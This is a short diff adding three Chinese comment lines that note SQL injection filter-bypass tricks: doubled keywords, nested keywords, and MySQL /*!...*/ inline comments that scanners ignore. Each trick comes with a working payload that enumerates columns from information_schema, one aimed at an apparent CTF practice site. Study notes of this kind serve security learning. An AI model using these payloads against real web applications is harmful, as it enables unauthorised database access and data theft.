@@ -1,0 +1,3 @@
+#使用双关键字unionunion 如：http://ctf5.shiyanbar.com/423/web/?id=1%27+unionunion%20+selectselect%20+column_name+fromfrom%20+information_schema.columns+wherewhere%20+%27t%27%3D%27t
+#使用关键字嵌套column_name=>column_namcolumn_namee  如：' /*!union*/ /*!select*/ column_namcolumn_namee /*!from*/ information_schema.columninformation_schema.columnss /*!where*/ ''='
+#使用/*!*/绕过代码扫描，一般语言都会认为此字段为解释字段，因此不做过滤，但唯有mysql认为这是可执行代码，如：' /*!union*/ /*!select*/ column_namcolumn_namee /*!from*/ information_schema.columninformation_schema.columnss /*!where*/ ''='
